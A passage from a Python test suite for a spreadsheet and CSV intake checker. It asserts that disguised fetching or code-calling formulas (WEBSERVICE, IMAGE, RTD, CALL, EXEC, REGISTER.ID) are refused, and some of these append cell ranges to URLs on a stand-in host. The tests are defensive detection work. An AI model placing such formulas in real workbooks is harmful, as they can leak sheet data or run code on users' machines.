    names_xml = f"<definedNames>{defined}</definedNames>" if defined else ""
    return (
        f"<workbook xmlns='{SM}' xmlns:r='{REL_NS}'><sheets>{sheets}</sheets>{names_xml}</workbook>"
    )


def with_parts(workbook_xml: str, sheet_rows: str, **parts: tuple[str, str]) -> bytes:
    """A workbook with one worksheet and extra parts (name -> (content type, xml))."""
    return package(
        {
            "[Content_Types].xml": content_types(
                ("/xl/workbook.xml", MAIN),
                ("/xl/worksheets/sheet1.xml", WORKSHEET),
                *((f"/{name}", kind) for name, (kind, _) in parts.items()),
            ),
            "xl/workbook.xml": workbook_xml,
            "xl/worksheets/sheet1.xml": f"<worksheet xmlns='{SM}'><sheetData>{sheet_rows}"
            "</sheetData></worksheet>",
            **{name: xml for name, (_, xml) in parts.items()},
        }
    )


# Ordinary workbooks the review found refused (quoted sheet names, structured references, a chart
# series, a pivot calculated field: "Register (...)" sheet names are common in Indian accounting).
ROUND2_ORDINARY = {
    "sum-over-register-sheet": with_parts(
        named_sheets("Summary", "Purchase Register (2024-25)"),
        cell("SUM('Purchase Register (2024-25)'!B2:B500)"),
    ),
    "print-area-on-register-sheet": with_parts(
        named_sheets(
            "Stock Register (Oct)",
            defined="<definedName name='_xlnm.Print_Area' localSheetId='0'>"
            "'Stock Register (Oct)'!$A$1:$H$40</definedName>",
        ),
        cell("1"),
    ),
    "vlookup-into-call-sheet": with_parts(
        named_sheets("Report", "Call (Inbound)"), cell("VLOOKUP(B1,'Call (Inbound)'!A:C,3,FALSE)")
    ),
    "quoted-name-with-apostrophe": with_parts(
        named_sheets("Asha's Calls (Oct)"), cell("SUM('Asha''s Calls (Oct)'!B2:B9)")
    ),
    "table-column-call-min": with_parts(
        named_sheets("S"),
        cell("1"),
        **{
            "xl/tables/table1.xml": (
                TABLE,
                f"<table xmlns='{SM}' id='1' name='Calls' ref='A1:B3'><tableColumns count='2'>"
                "<tableColumn id='1' name='Call (min)'/><tableColumn id='2' name='Seconds'>"
                "<calculatedColumnFormula>Calls[[#This Row],[Call (min)]]*60"
                "</calculatedColumnFormula></tableColumn></tableColumns></table>",
            )
        },
    ),
    "chart-series-from-image-sheet": with_parts(
        named_sheets("Product Image (old)"),
        cell("1"),
        **{
            "xl/charts/chart1.xml": (
                CHART,
                f"<c:chartSpace xmlns:c='{CHART_NS}'><c:chart><c:plotArea><c:barChart><c:ser>"
                "<c:val><c:numRef><c:f>'Product Image (old)'!$B$2:$B$9</c:f></c:numRef></c:val>"
                "</c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>",
            )
        },
    ),
    "pivot-calculated-field": with_parts(
        named_sheets("S"),
        cell("1"),
        **{
            "xl/pivotCache/pivotCacheDefinition1.xml": (
                PIVOT,
                f"<pivotCacheDefinition xmlns='{SM}'><cacheFields count='2'>"
                "<cacheField name='Call (min)' numFmtId='0'/><cacheField name='Hours'"
                " numFmtId='0' formula=\"'Call (min)'/60\" databaseField='0'/></cacheFields>"
                "</pivotCacheDefinition>",
            )
        },
    ),
    "hyperlink-and-list-validation": with_parts(
        named_sheets("S"),
        cell('HYPERLINK("https://lab.example","Image (brochure)")'),
    ),
    "unquoted-register-sheet": with_parts(named_sheets("Register"), cell("SUM(Register!B2:B9)")),
    "image-table-column": with_parts(named_sheets("S"), cell("SUM(Image[Amount])")),
}
# Eta-reduced functions: a fetching function passed by name, without its bracket (PARSERS2-6).
ROUND2_ETA = {
    "xleta-in-map": cell('_xlfn.MAP("http://example.invalid/?"&amp;B1:B9,_xlfn._xleta.WEBSERVICE)'),
    "xleta-image": cell('_xlfn.MAP("http://example.invalid/p.png",_xleta.IMAGE)'),
    "bare-name-in-byrow": cell("_xlfn.BYROW(B1:B9,WEBSERVICE)"),
    "bare-name-semicolon": cell("_xlfn.BYROW(B1:B9;IMAGE)"),
}


class TestReviewRound2Formulas:
    @pytest.mark.parametrize("label", sorted(ROUND2_ORDINARY))
    def test_ordinary_workbooks_pass(self, label):
        """PARSERS2-5: quoted sheet names, structured references and sheet or table names are
        removed or told apart before a name is looked for."""
        assert recognise("xlsx", ROUND2_ORDINARY[label]) is True

    @pytest.mark.parametrize("label", sorted(ROUND2_ETA))
    def test_eta_reduced_fetching_functions_are_refused(self, label):
        assert recognise("xlsx", workbook(ROUND2_ETA[label])) == storage.FORMULA_REFUSED

    def test_a_defined_name_that_is_a_fetching_function(self):
        content = workbook(
            cell('Fetch("http://example.invalid/x")'),
            defined="<definedName name='Fetch'>_xlfn._xleta.WEBSERVICE</definedName>",
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED
        bare = workbook(cell("Fetch(A1)"), defined="<definedName name='Fetch'>IMAGE</definedName>")
        assert recognise("xlsx", bare) == storage.FORMULA_REFUSED

    def test_a_template_workbook_is_read(self):
        """A workbook template's main part (spreadsheetml.template.main+xml) holds defined names
        too."""
        content = package(
            {
                "[Content_Types].xml": content_types(("/xl/workbook.xml", TEMPLATE_MAIN)),
                "xl/workbook.xml": f"<workbook xmlns='{SM}'><definedNames><definedName name='x'>"
                'WEBSERVICE("http://e/")</definedName></definedNames></workbook>',
            }
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    def test_the_outer_main_part_under_another_name(self):
        content = package(
            {
                "[Content_Types].xml": content_types(
                    ("/xl/book.xml", MAIN), ("/xl/worksheets/sheet1.xml", WORKSHEET)
                ),
                "xl/workbook.xml": "<x/>",
                "xl/book.xml": f"<workbook xmlns='{SM}'/>",
                "xl/worksheets/sheet1.xml": worksheet(cell('WEBSERVICE("http://e/")')),
            }
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "data",
        [
            'url\nhttp://e/a\n"=MAP(""http://e/?""&A2:A9,WEBSERVICE)"\n',
            "a,b\nx,=BYROW(A1:A3;IMAGE)\n",
            'a;b\nx;"=BYROW(A1:A3; IMAGE )"\n',  # quoted: its ";" would split it into cells
            'a,b\nx,"=MAP(A1:A3,_xlfn._xleta.WEBSERVICE)"\n',
        ],
        ids=["map", "byrow-semicolon", "blanks", "xleta"],
    )
    def test_eta_reduced_csv_cells_are_refused(self, data):
        assert csv_outcome(data) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "data",
        [
            'a,b\nx,"- email, call, visit"\n',  # a list in a note, not inside a call
            'a,b\nx,"Call, then email"\n',
            "a,b\nx,='Call (log)'!A1\n",
            "a,b\nx,=SUM('Purchase Register (2024-25)'!B2:B9)\n",
            "a,b\nx,=Calls[[#This Row],[Call (min)]]*60\n",
        ],
        ids=["note-list", "quoted-note", "quoted-sheet", "register-sheet", "structured"],
    )
    def test_ordinary_csv_cells_pass(self, data):
        assert csv_outcome(data) is True


# --- review round 3 (PARSERS3-3) ----------------------------------------------------------------
# A fetching function nobody names a range after, passed as a value where it can be called: the
# round-2 rule only knew an argument after "," or ";".
ROUND3_VALUES = {
    "first-argument": "_xlfn.MAP(WEBSERVICE,A1:A2)",
    "bracketed": "(WEBSERVICE)",
    "bracketed-argument": "IF(TRUE,(WEBSERVICE),SUM)",
    "called-lambda": '_xlfn.LAMBDA(_xlpm.f,_xlpm.f("http://example.invalid/x"))(WEBSERVICE)',
    "rtd": "CHOOSE(1,(RTD))",
    "call": "(CALL)",
    "exec": "IF(1,+EXEC,0)",
    "import": "(_xlfn.IMPORTXML)",
    "register-id": "(REGISTER.ID)",
}
# Defined names then called by their name (=Fetch(url)).
ROUND3_DEFINED = ["(WEBSERVICE)", "+WEBSERVICE", "@WEBSERVICE", "(RTD)", " -CALL "]
# IMAGE and REGISTER are plausible range names: as operands they stay ordinary (an owner decision).
ROUND3_ORDINARY = [
    "SUM(Register)",
    "SUM(Image)",
    "(Register)*2",
    "Image+1",
    "INDEX(Register,2)",
    "SUM(Registers)",
    "Calls*2",
]


class TestReviewRound3Formulas:
    @pytest.mark.parametrize("label", sorted(ROUND3_VALUES))
    def test_a_value_only_function_passed_as_a_value_is_refused(self, label):
        assert recognise("xlsx", workbook(cell(ROUND3_VALUES[label]))) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize("value", ROUND3_DEFINED)
    def test_a_defined_name_holding_one_is_refused(self, value):
        content = workbook(
            cell('Fetch("http://example.invalid/x")'),
            defined=f"<definedName name='Fetch'>{value}</definedName>",
        )
        assert recognise("xlsx", content) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize("formula", ROUND3_ORDINARY)
    def test_range_names_stay_ordinary(self, formula):
        assert recognise("xlsx", workbook(cell(formula))) is True

    @pytest.mark.parametrize(
        "data",
        [
            'a,"=MAP(WEBSERVICE,A1:A2)"\n',
            "a,=(WEBSERVICE)\n",
            'a,"=IF(TRUE,(WEBSERVICE),SUM)"\n',
            'a,"=LAMBDA(f,f(""http://example.invalid/x""))(WEBSERVICE)"\n',
            "a,=(RTD)\n",
        ],
        ids=["first-argument", "bracketed", "bracketed-argument", "called-lambda", "rtd"],
    )
    def test_csv_cells_passing_one_are_refused(self, data):
        assert csv_outcome(data) == storage.FORMULA_REFUSED

    @pytest.mark.parametrize(
        "data",
        [
            'a,b\nx,"- call, then email"\n',  # a note: at no depth, no defined names in a CSV
            "a,b\nx,- call back tomorrow\n",
            "a,b\nx,-CALL\n",
            "a,b\nx,=SUM(Register)\n",
            "a,b\nx,@Image\n",
        ],
        ids=["note-list", "note", "bare", "register-range", "image-range"],
    )
    def test_ordinary_csv_cells_pass(self, data):
        assert csv_outcome(data) is True
